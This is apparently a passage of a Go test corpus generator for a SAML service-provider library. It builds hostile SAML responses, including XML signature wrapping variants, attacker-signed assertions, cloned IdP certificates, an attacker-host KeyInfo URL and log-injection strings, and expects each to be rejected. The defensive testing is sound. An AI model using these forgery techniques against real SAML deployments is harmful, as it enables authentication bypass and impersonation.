			expect: statusOf(responderCode, noPassive, "", "Responder, NoPassive"),
		},
		{
			id: "status/hostile-status-codes", attack: "status codes and message built for log injection (#87 code review F5)",
			refs: append(refStatus, "#87 code review F5"),
			build: func() []byte {
				return g.statusResponseXML("acme", setStatus("level=error msg=admin-logged-in user=mallory",
					"\turn:evil\n", "line1\nline2\t\rlevel=error"))
			},
			expect: statusOf("level=errormsg=admin-logged-inuser=mallory", "urn:evil", "line1line2level=error",
				"non-standard status, non-standard status"),
		},
		{
			id: "status/non-standard-code-in-the-saml-namespace", attack: "a status code with the SAML 2.0 prefix but no standard name (#87 code review F5)",
			refs: append(refStatus, "#87 code review F5"),
			build: func() []byte {
				return g.statusResponseXML("acme", setStatus("urn:oasis:names:tc:SAML:2.0:status:AdminLoggedIn", "", ""))
			},
			expect: statusOf("urn:oasis:names:tc:SAML:2.0:status:AdminLoggedIn", "", "", "non-standard status"),
		},
		{
			id: "status/success-with-whitespace", attack: "a Success status code followed by a TAB: Success once sanitized, not the URI (audit SAML-I6)",
			refs: refStatus,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{raw: func(s string) string {
					return strings.Replace(s, `status:Success"`, `status:Success&#x9;"`, 1)
				}}))
			},
			expect: rejected("ErrMalformedResponse", "malformed Success status code"),
		},
		{
			id:     "status/message-with-format-characters",
			attack: "StatusMessage carrying bidi overrides, zero-width characters and line separators (log and display spoofing, audit SAML-I7)",
			refs:   append(refStatus, "Unicode TR #36 §2"),
			build: func() []byte {
				return g.statusResponseXML("acme", setStatus(responderCode, authnFailed,
					"Sign-in failed\u202e\u2066 for\u200b admin\u2028level=error\u2029\ufeff\u00ad user=mallory"))
			},
			expect: statusOf(responderCode, authnFailed, "Sign-in failed for adminlevel=error user=mallory", "Responder, AuthnFailed"),
		},
		{
			id: "status/error-with-assertion", attack: "error status carrying an assertion", refs: refStatus,
			build: func() []byte {
				return g.xml("acme", onResponse(setStatus(requesterCode, "", "")))
			},
			expect: rejected("ErrMalformedResponse", "an error response carries an assertion"),
		},
		{
			id: "status/missing", attack: "Response without Status", refs: refStatus,
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.RemoveChild(child(r, "Status")) }))
			},
			expect: rejected("ErrMalformedResponse", "a Response needs exactly one Status"),
		},
		{
			id: "status/two-status-codes", attack: "two top-level StatusCodes", refs: refStatus,
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) {
					st := child(r, "Status")
					st.AddChild(child(st, "StatusCode").Copy())
				}))
			},
			expect: rejected("ErrMalformedResponse", "a Status needs exactly one StatusCode with a Value"),
		},
		{
			id: "status/two-status-messages", attack: "two StatusMessages", refs: refStatus,
			build: func() []byte {
				return g.statusResponseXML("acme", func(r *etree.Element) {
					setStatus(requesterCode, "", "a")(r)
					child(r, "Status").CreateElement("samlp:StatusMessage").SetText("b")
				})
			},
			expect: rejected("ErrMalformedResponse", "repeated StatusCode or StatusMessage"),
		},
		{
			id: "status/error-for-another-request", attack: "error status answering another request (not bound to this transaction)",
			refs: refStatus,
			build: func() []byte {
				return g.statusResponseXML("acme", func(r *etree.Element) {
					setStatus(requesterCode, "", "")(r)
					r.CreateAttr("InResponseTo", "_evil-request")
				})
			},
			expect: rejected("ErrInResponseToMismatch", "Response InResponseTo is not the request ID"),
		},
	}
}

func (g *corpusGen) shapeSpecs() []corpusSpec {
	shape := func(id, attack string, edit func(a *etree.Element), sentinel, detail string, refs ...string) corpusSpec {
		return corpusSpec{
			id: id, attack: attack, refs: append([]string{refProfiles, refQ2}, refs...),
			build:  func() []byte { return g.xml("acme", compact(onAssertion(edit))) },
			expect: rejected(sentinel, detail),
		}
	}

	subject := func(a *etree.Element) *etree.Element { return path(a, "Subject") }

	return []corpusSpec{
		shape("shape/no-subject", "signed assertion without Subject",
			func(a *etree.Element) { a.RemoveChild(subject(a)) }, "ErrInvalidAssertion", "an assertion needs exactly one Subject"),
		shape("shape/no-nameid", "signed assertion without NameID (AD FS without a NameID claim rule)",
			func(a *etree.Element) { s := subject(a); s.RemoveChild(child(s, "NameID")) }, "ErrInvalidAssertion", "a Subject needs exactly one NameID"),
		shape("shape/two-nameids", "two NameIDs in the signed Subject (the decoder keeps one)",
			func(a *etree.Element) {
				s := subject(a)
				extra := child(s, "NameID").Copy()
				extra.SetText(evilNameID)
				s.InsertChildAt(child(s, "NameID").Index()+1, extra)
			}, "ErrInvalidAssertion", "a Subject needs exactly one NameID"),
		shape("shape/empty-nameid", "signed assertion with an empty NameID",
			setNameID(""), "ErrInvalidAssertion", "missing or empty NameID"),
		shape("shape/baseid-subject", "BaseID subject next to the NameID",
			func(a *etree.Element) { subject(a).CreateElement("saml:BaseID") }, "ErrInvalidAssertion", "BaseID subjects are not supported"),
		shape("shape/two-subject-confirmations", "a second SubjectConfirmation (merged by single-valued decoders)",
			func(a *etree.Element) { s := subject(a); s.AddChild(child(s, "SubjectConfirmation").Copy()) },
			"ErrInvalidAssertion", "a Subject needs exactly one SubjectConfirmation"),
		shape("shape/holder-of-key", "holder-of-key confirmation instead of bearer",
			func(a *etree.Element) {
				path(a, "Subject", "SubjectConfirmation").CreateAttr("Method", "urn:oasis:names:tc:SAML:2.0:cm:holder-of-key")
			}, "ErrInvalidAssertion", "the subject confirmation is not bearer"),
		shape("shape/no-subject-confirmation-data", "bearer confirmation without SubjectConfirmationData",
			func(a *etree.Element) {
				sc := path(a, "Subject", "SubjectConfirmation")
				sc.RemoveChild(child(sc, "SubjectConfirmationData"))
			}, "ErrInvalidAssertion", "a bearer confirmation needs exactly one SubjectConfirmationData"),
		shape("shape/subject-confirmation-data-not-before", "bearer SubjectConfirmationData with NotBefore",
			func(a *etree.Element) { scd(a).CreateAttr("NotBefore", ts(-time.Minute)) },
			"ErrInvalidAssertion", "a bearer SubjectConfirmationData must not carry NotBefore"),
		shape("shape/subject-confirmation-data-without-not-on-or-after", "bearer SubjectConfirmationData without NotOnOrAfter",
			func(a *etree.Element) { scd(a).RemoveAttr("NotOnOrAfter") }, "ErrInvalidAssertion", "missing element"),
		shape("shape/no-authn-statement", "signed assertion without AuthnStatement",
			func(a *etree.Element) { a.RemoveChild(child(a, "AuthnStatement")) },
			"ErrInvalidAssertion", "an assertion needs exactly one AuthnStatement"),
		shape("shape/two-authn-statements", "two AuthnStatements",
			func(a *etree.Element) { a.AddChild(child(a, "AuthnStatement").Copy()) },
			"ErrInvalidAssertion", "an assertion needs exactly one AuthnStatement"),
		shape("shape/no-authn-instant", "AuthnStatement without AuthnInstant",
			func(a *etree.Element) { child(a, "AuthnStatement").RemoveAttr("AuthnInstant") },
			"ErrInvalidAssertion", "AuthnStatement without AuthnInstant"),
		shape("shape/no-authn-context", "AuthnStatement without AuthnContext",
			func(a *etree.Element) { st := child(a, "AuthnStatement"); st.RemoveChild(child(st, "AuthnContext")) },
			"ErrInvalidAssertion", "an AuthnStatement needs exactly one AuthnContext"),
		shape("shape/two-class-refs", "two AuthnContextClassRefs",
			func(a *etree.Element) {
				ac := path(a, "AuthnStatement", "AuthnContext")
				ac.AddChild(child(ac, "AuthnContextClassRef").Copy())
			}, "ErrInvalidAssertion", "repeated AuthnContextClassRef"),
		shape("shape/unknown-condition", "a generic <Condition> (Indeterminate, Core §2.5.1.1)",
			func(a *etree.Element) { child(a, "Conditions").CreateElement("saml:Condition") },
			"ErrInvalidAssertion", "condition not understood", "SAML Core §2.5.1.1"),
		shape("shape/foreign-condition", "a foreign-namespace condition",
			func(a *etree.Element) {
				el := child(a, "Conditions").CreateElement("x:Custom")
				el.CreateAttr("xmlns:x", "urn:evil:attacker.example")
			}, "ErrInvalidAssertion", "condition not understood", "SAML Core §2.5.1.1"),
		shape("shape/two-conditions", "two Conditions elements",
			func(a *etree.Element) {
				c := a.CreateElement("saml:Conditions")
				c.CreateElement("saml:AudienceRestriction").CreateElement("saml:Audience").SetText(spEntityID)
			}, "ErrInvalidAssertion", "repeated Conditions"),
		shape("shape/two-one-time-use", "two OneTimeUse conditions",
			func(a *etree.Element) {
				c := child(a, "Conditions")
				c.CreateElement("saml:OneTimeUse")
				c.CreateElement("saml:OneTimeUse")
			}, "ErrInvalidAssertion", "repeated OneTimeUse or ProxyRestriction", "SAML Core §2.5.1.5"),
		shape("shape/negative-proxy-count", "ProxyRestriction Count=-1",
			func(a *etree.Element) {
				child(a, "Conditions").CreateElement("saml:ProxyRestriction").CreateAttr("Count", "-1")
			},
			"ErrInvalidAssertion", "ProxyRestriction Count is not a non-negative integer", "SAML Core §2.5.1.6"),
		shape("shape/empty-audience-restriction", "an AudienceRestriction without Audience",
			func(a *etree.Element) { child(a, "Conditions").CreateElement("saml:AudienceRestriction") },
			"ErrInvalidAssertion", "malformed audience list"),
		shape("shape/assertion-version", "assertion Version 2.1",
			func(a *etree.Element) { a.CreateAttr("Version", "2.1") }, "ErrMalformedResponse", "unsupported assertion version", "SAML Core §2.3.3"),
		{
			id: "shape/two-nameids-in-attribute-value", attack: "two NameIDs in one AttributeValue (merged by the decoder)",
			refs: []string{refQ2},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					av := path(a, "AttributeStatement").ChildElements()[2].ChildElements()[0]
					extra := child(av, "NameID").Copy()
					extra.SetText(evilNameID)
					av.AddChild(extra)
				}))
			},
			expect: rejected("ErrInvalidAssertion", "repeated NameID in an AttributeValue"),
		},
		{
			id: "shape/no-assertion", attack: "Success status without an assertion", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.RemoveChild(child(r, "Assertion")) }))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "shape/assertion-without-id", attack: "assertion without ID", refs: []string{refIDs},
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) { child(r, "Assertion").RemoveAttr("ID") }}))
			},
			expect: rejected("ErrMalformedResponse", "Assertion without ID or IssueInstant"),
		},
		{
			id: "shape/response-without-id", attack: "Response without ID", refs: []string{refIDs},
			build: func() []byte {
				return g.xml("acme", compact(onResponse(func(r *etree.Element) { r.RemoveAttr("ID") })))
			},
			expect: rejected("ErrMalformedResponse", "Response without ID or IssueInstant"),
		},
		{
			id: "shape/response-version", attack: "Response Version 1.1", refs: []string{"SAML Core §3.2.2"},
			build: func() []byte {
				return g.xml("acme", compact(onResponse(func(r *etree.Element) { r.CreateAttr("Version", "1.1") })))
			},
			expect: rejected("ErrMalformedResponse", "unsupported SAML version"),
		},
		{
			id: "shape/nameid-format-mismatch", tx: "acme-persistent", attack: "persistent NameID requested, emailAddress asserted",
			refs: []string{"SAML Core §3.4.1.1"},
			build: func() []byte {
				return g.xml("acme-persistent", compact(onAssertion(func(a *etree.Element) {
					path(a, "Subject", "NameID").CreateAttr("Format", samlsp.NameIDFormatEmailAddress)
				})))
			},
			expect: rejected("ErrNameIDFormatMismatch", ""),
		},
		{
			id: "shape/authn-context-mismatch", tx: "acme-authncontext", attack: "X509 context requested exactly, password asserted",
			refs:   []string{"SAML Core §3.3.2.2.1"},
			build:  func() []byte { return g.xml("acme-authncontext", compact(respOpts{})) },
			expect: rejected("ErrAuthnContextMismatch", ""),
		},
	}
}

func (g *corpusGen) keySpecs() []corpusSpec {
	refKeys := []string{refOWASP, "SAML Core §5.4.5"}
	replaceKeyInfo := func(content func(ki *etree.Element)) func(r *etree.Element) {
		return func(r *etree.Element) {
			ki := path(r, "Assertion", "Signature", "KeyInfo")
			for _, c := range ki.ChildElements() {
				ki.RemoveChild(c)
			}

			content(ki)
		}
	}
	certText := func(name string) string { return base64.StdEncoding.EncodeToString(g.certs[name].Raw) }

	return []corpusSpec{
		{
			id: "keys/untrusted-signer", attack: "signed by an attacker key carried in KeyInfo", refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["attacker"]}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/trusted-certificate-attacker-key", attack: "attacker signature with the trusted certificate copied in KeyInfo",
			refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["attacker"]}, after: func(r *etree.Element) {
					path(r, "Assertion", "Signature", "KeyInfo", "X509Data", "X509Certificate").SetText(certText("idp-a"))
				}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/certificate-faking", attack: "self-signed certificate cloning the IdP certificate's subject and serial (SAML Raider)",
			refs: append(refKeys, "SAML Raider certificate cloning"),
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["faked-idp-a"]}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/other-connection-key", attack: "signed by another connection's IdP key", refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["idp-b"]}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/expired-trusted-certificate", attack: "signed by a trusted key whose certificate expired",
			refs: append(refKeys, "SAML errata E69"), knobs: corpusKnobs{Trust: []string{"expired"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["expired"]}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/only-expired-candidates", attack: "no KeyInfo, every trusted certificate expired (rollover retry finds none)",
			refs: refKeys, knobs: corpusKnobs{Trust: []string{"expired", "expired-2"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["expired"], noKeyInfo: true}})
			},
			expect: rejected("ErrInvalidSignature", "no trusted certificate is currently valid"),
		},
		{
			id: "keys/rollover-newest-of-four-without-keyinfo", attack: "four valid trusted keys, signed by the newest without KeyInfo (tried first)",
			refs: refKeys, knobs: corpusKnobs{Trust: []string{"roll-1", "roll-2", "roll-3", "roll-4"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["roll-4"], noKeyInfo: true}})
			},
			expect: accepted(baselineIdentity()),
		},
		{
			id: "keys/rollover-oldest-of-four-without-keyinfo", attack: "four valid trusted keys, signed by the oldest without KeyInfo: beyond the three tried (#87 code review F4)",
			refs:  append(refKeys, "#87 code review F4 (retry capped at 3, newest first)"),
			knobs: corpusKnobs{Trust: []string{"roll-1", "roll-2", "roll-3", "roll-4"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["roll-1"], noKeyInfo: true}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/keyinfo-keyname-only", attack: "KeyInfo with a KeyName only (unsupported, fails closed)", refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{after: replaceKeyInfo(func(ki *etree.Element) {
					ki.CreateElement("ds:KeyName").SetText("idp-a")
				})})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/keyinfo-rsa-key-value", attack: "attacker signature with an RSAKeyValue-only KeyInfo", refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["attacker"]}, after: replaceKeyInfo(func(ki *etree.Element) {
					rsaPub, ok := g.keys["attacker"].signer.Public().(interface{ Size() int })
					require.True(g.t, ok)
					kv := ki.CreateElement("ds:KeyValue").CreateElement("ds:RSAKeyValue")
					kv.CreateElement("ds:Modulus").SetText(fmt.Sprintf("%d-byte attacker modulus", rsaPub.Size()))
					kv.CreateElement("ds:Exponent").SetText("AQAB")
				})})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/keyinfo-retrieval-method", attack: "KeyInfo RetrievalMethod pointing at an attacker URL (never fetched)", refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["attacker"]}, after: replaceKeyInfo(func(ki *etree.Element) {
					ki.CreateElement("ds:RetrievalMethod").CreateAttr("URI", "https://attacker.example/key.der")
				})})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/keyinfo-attacker-certificate-first", attack: "attacker signature, KeyInfo listing the attacker certificate then the trusted one",
			refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["attacker"]}, after: func(r *etree.Element) {
					path(r, "Assertion", "Signature", "KeyInfo", "X509Data").CreateElement("ds:X509Certificate").SetText(certText("idp-a"))
				}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/keyinfo-trusted-certificate-second", attack: "valid IdP signature but KeyInfo lists an untrusted certificate first (fails closed)",
			refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{after: func(r *etree.Element) {
					xd := path(r, "Assertion", "Signature", "KeyInfo", "X509Data")
					first := etree.NewElement("ds:X509Certificate")
					first.SetText(certText("attacker"))
					xd.InsertChildAt(0, first)
				}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/attacker-signed-response", attack: "attacker-signed Response around an unsigned assertion", refs: refKeys,
			build: func() []byte {
				return g.xml("acme", respOpts{unsignedAssert: true, signResponse: true, responseSig: sigOpts{signer: g.keys["attacker"]}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "keys/ecdsa-raw-r-s", attack: "ECDSA signature value in XML Signature 1.1 raw r||s form (goxmldsig verifies DER: fails closed)",
			refs: []string{"XML Signature 1.1 §6.4.3", "LIMITATIONS.md (ECDSA encoding)"}, knobs: corpusKnobs{Trust: []string{"idp-ec"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["idp-ec"]}, before: func(_, a *etree.Element) {
					sv := path(a, "Signature", "SignatureValue")
					der, err := base64.StdEncoding.DecodeString(sv.Text())
					require.NoError(g.t, err)
					_, isEC := g.keys["idp-ec"].signer.(*ecdsa.PrivateKey)
					require.True(g.t, isEC)
					sv.SetText(base64.StdEncoding.EncodeToString(rawRS(der)))
				}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
	}
}

func (g *corpusGen) xswSpecs() []corpusSpec {
	refs := []string{refXSW, refRaider, refDSig}
	responseSigned := respOpts{unsignedAssert: true, signResponse: true}
	assertionOf := func(r *etree.Element) *etree.Element { return child(r, "Assertion") }

	xsw := func(n int, attack string, base respOpts, transform func(r *etree.Element), detail string, sentinel string) corpusSpec {
		o := compact(base)
		o.after = transform

		return corpusSpec{
			id: fmt.Sprintf("xsw/xsw%d", n), attack: attack, refs: append(refs, fmt.Sprintf("%s%d", refRaider, n)),
			build:  func() []byte { return g.xml("acme", o) },
			expect: rejected(sentinel, detail),
		}
	}

	return []corpusSpec{
		xsw(1, "XSW1: signed Response cloned inside its own Signature; the original Response is modified and renamed",
			responseSigned, func(r *etree.Element) {
				sig := child(r, "Signature")
				clone := unsignedCopy(r)
				sig.AddChild(clone)
				r.CreateAttr("ID", "_evil_response_ID")
				setNameID(evilNameID)(assertionOf(r))
			}, duplicateID, "ErrMalformedResponse"),
		xsw(2, "XSW2: signed Response cloned before its Signature; the original Response is modified and renamed",
			responseSigned, func(r *etree.Element) {
				sig := child(r, "Signature")
				clone := unsignedCopy(r)
				r.InsertChildAt(sig.Index(), clone)
				r.CreateAttr("ID", "_evil_response_ID")
				setNameID(evilNameID)(assertionOf(r))
			}, duplicateID, "ErrMalformedResponse"),
		xsw(3, "XSW3: unsigned forged clone (new ID) inserted before the signed Assertion",
			respOpts{}, func(r *etree.Element) {
				a := assertionOf(r)
				r.InsertChildAt(a.Index(), evil(a.Copy(), "_evil_assertion_ID"))
			}, oneAssertion, "ErrMalformedResponse"),
		xsw(4, "XSW4: unsigned forged clone (new ID) wrapping the signed Assertion",
			respOpts{}, func(r *etree.Element) {
				a := assertionOf(r)
				e := evil(a.Copy(), "_evil_assertion_ID")
				r.RemoveChild(a)
				e.AddChild(a)
				r.AddChild(e)
			}, oneAssertion, "ErrMalformedResponse"),
		xsw(5, "XSW5: signed Assertion modified and renamed, its unsigned original appended",
			respOpts{}, func(r *etree.Element) {
				a := assertionOf(r)
				r.AddChild(unsignedCopy(a))
				a.CreateAttr("ID", "_evil_assertion_ID")
				setNameID(evilNameID)(a)
			}, oneAssertion, "ErrMalformedResponse"),
		xsw(6, "XSW6: signed Assertion modified and renamed, its unsigned original inside the Signature",
			respOpts{}, func(r *etree.Element) {
				a := assertionOf(r)
				child(a, "Signature").AddChild(unsignedCopy(a))
				a.CreateAttr("ID", "_evil_assertion_ID")
				setNameID(evilNameID)(a)
			}, oneAssertion, "ErrMalformedResponse"),
		xsw(7, "XSW7: unsigned forged clone (same ID) inside an Extensions element before the signed Assertion",
			respOpts{}, func(r *etree.Element) {
				a := assertionOf(r)
				ext := etree.NewElement("samlp:Extensions")
				r.InsertChildAt(a.Index(), ext)
				ext.AddChild(evil(a.Copy(), ""))
			}, duplicateID, "ErrMalformedResponse"),
		xsw(8, "XSW8: signed Assertion modified, its unsigned original (same ID) in a ds:Object of its Signature",
			respOpts{}, func(r *etree.Element) {
				a := assertionOf(r)
				orig := unsignedCopy(a)
				setNameID(evilNameID)(a)
				child(a, "Signature").CreateElement("ds:Object").AddChild(orig)
			}, duplicateID, "ErrMalformedResponse"),
		{
			id: "xsw/xsw7-fresh-id", attack: "XSW7 with a fresh ID on the forged clone (counted, not a duplicate)", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					ext := etree.NewElement("samlp:Extensions")
					r.InsertChildAt(a.Index(), ext)
					ext.AddChild(evil(a.Copy(), "_evil_assertion_ID"))
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/xsw8-fresh-id", attack: "XSW8 with a fresh ID on the hidden clone", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					orig := evil(a.Copy(), "_evil_assertion_ID")
					child(a, "Signature").CreateElement("ds:Object").AddChild(orig)
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/original-in-extensions", attack: "signed Assertion moved into Extensions, forged one in its place", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					r.RemoveChild(a)
					ext := etree.NewElement("samlp:Extensions")
					ext.AddChild(a)
					r.InsertChildAt(1, ext)
					r.AddChild(forged("_evil-forged"))
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/original-in-status-detail", attack: "signed Assertion moved into StatusDetail (Success), forged one in its place",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					r.RemoveChild(a)
					child(r, "Status").CreateElement("samlp:StatusDetail").AddChild(a)
					r.AddChild(forged("_evil-forged"))
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/assertion-in-error-status-detail", attack: "error status hiding a signed Assertion in StatusDetail", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					r.RemoveChild(a)
					setStatus(responderCode, "", "")(r)
					child(r, "Status").CreateElement("samlp:StatusDetail").AddChild(a)
				}}))
			},
			expect: rejected("ErrMalformedResponse", "an error response carries an assertion"),
		},
		{
			id: "xsw/original-in-foreign-wrapper", attack: "signed Assertion wrapped in a foreign element, forged one in its place", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					r.RemoveChild(a)
					w := r.CreateElement("x:Wrapper")
					w.CreateAttr("xmlns:x", "urn:evil:attacker.example")
					w.AddChild(a)
					r.AddChild(forged("_evil-forged"))
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/original-in-advice", attack: "signed Assertion hidden in the Advice of a forged one", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					r.RemoveChild(a)
					f := forged("_evil-forged")
					f.CreateElement("saml:Advice").AddChild(a)
					r.AddChild(f)
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/forged-before-signed", attack: "forged assertion inserted before the signed one", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					r.InsertChildAt(assertionOf(r).Index(), forged("_evil-forged"))
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/assertion-injected-into-signed-response", attack: "forged assertion appended to a signed Response", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{signResponse: true, after: func(r *etree.Element) { r.AddChild(forged("_evil-forged")) }}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/default-namespace-second-assertion", attack: "second assertion in the SAML namespace by default declaration", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := etree.NewElement("Assertion")
					a.CreateAttr("xmlns", nsA)
					a.CreateAttr("ID", "_evil-default-ns")
					a.CreateAttr("Version", "2.0")
					r.AddChild(a)
				}}))
			},
			expect: rejected("ErrMalformedResponse", oneAssertion),
		},
		{
			id: "xsw/no-namespace-sibling-assertion", attack: "no-namespace Assertion look-alike next to the signed one (refused by the verifier's decoder)",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := etree.NewElement("Assertion")
					a.CreateAttr("xmlns", "")
					a.CreateAttr("ID", "_evil-no-ns")
					r.AddChild(a)
				}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "xsw/foreign-namespace-sibling-assertion", attack: "foreign-namespace Assertion look-alike carrying the attacker's identity",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					f := forged("_evil-foreign-ns")
					f.Space = "x"
					f.CreateAttr("xmlns:x", "urn:evil:attacker.example")
					r.AddChild(f)
				}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "xsw/signature-in-subject", attack: "assertion signature moved into the Subject", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					sig := child(a, "Signature")
					a.RemoveChild(sig)
					path(a, "Subject").AddChild(sig)
				}}))
			},
			expect: rejected("ErrInvalidSignature", misplacedSig),
		},
		{
			id: "xsw/response-signature-in-status", attack: "Response signature moved into Status", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{unsignedAssert: true, signResponse: true, after: func(r *etree.Element) {
					sig := child(r, "Signature")
					r.RemoveChild(sig)
					child(r, "Status").AddChild(sig)
				}}))
			},
			expect: rejected("ErrInvalidSignature", misplacedSig),
		},
		{
			id: "xsw/two-assertion-signatures", attack: "two signatures on the assertion", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					a := assertionOf(r)
					a.AddChild(child(a, "Signature").Copy())
				}}))
			},
			expect: rejected("ErrInvalidSignature", misplacedSig),
		},
		{
			id: "xsw/assertion-signature-copied-to-response", attack: "assertion signature copied to the Response level", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{after: func(r *etree.Element) {
					r.InsertChildAt(1, child(assertionOf(r), "Signature").Copy())
				}}))
			},
			expect: rejected("ErrInvalidSignature", notReferenced),
		},
		{
			id: "xsw/foreign-namespace-signature", attack: "Signature element in a foreign namespace inside the Subject", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					el := path(a, "Subject").CreateElement("x:Signature")
					el.CreateAttr("xmlns:x", "urn:evil:attacker.example")
				})))
			},
			expect: rejected("ErrInvalidSignature", "Signature element outside the XML-DSig namespace"),
		},
		{
			id:     "xsw/valid-response-signature-over-attacker-assertion-signature",
			attack: "IdP-signed Response around an assertion carrying an attacker signature (any present signature must verify)",
			refs:   append(refs, "gosaml2 verifyAssertionSignaturesIfPresent"),
			build: func() []byte {
				return g.xml("acme", compact(respOpts{signResponse: true, assertionSig: sigOpts{signer: g.keys["attacker"]}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id:     "xsw/valid-response-signature-over-corrupted-assertion-signature",
			attack: "IdP-signed Response around an assertion whose own signature value is corrupted",
			refs:   append(refs, "gosaml2 verifyAssertionSignaturesIfPresent"),
			build: func() []byte {
				return g.xml("acme", compact(respOpts{signResponse: true, before: func(_, a *etree.Element) {
					sv := path(a, "Signature", "SignatureValue")
					sv.SetText("AAAA" + sv.Text()[4:])
				}}))
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "xsw/saml-prefix-rebound-on-response", attack: "saml prefix rebound to a foreign namespace on the Response", refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(respOpts{raw: func(s string) string {
					return strings.Replace(s, `xmlns:saml="`+nsA+`" ID="`+responseID, `xmlns:saml="urn:evil:attacker.example" ID="`+responseID, 1)
				}}))
			},
			expect: rejected("ErrIssuerMismatch", "Response needs exactly one Issuer"),
		},
		{
			id: "xsw/nameid-in-foreign-namespace", attack: "signed Subject whose NameID is in a foreign namespace (a local-name reader would take it)",
			refs: refs,
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					nid := path(a, "Subject", "NameID")
					nid.Space = "x"
					nid.CreateAttr("xmlns:x", "urn:evil:attacker.example")
					nid.SetText(evilNameID)
				})))
			},
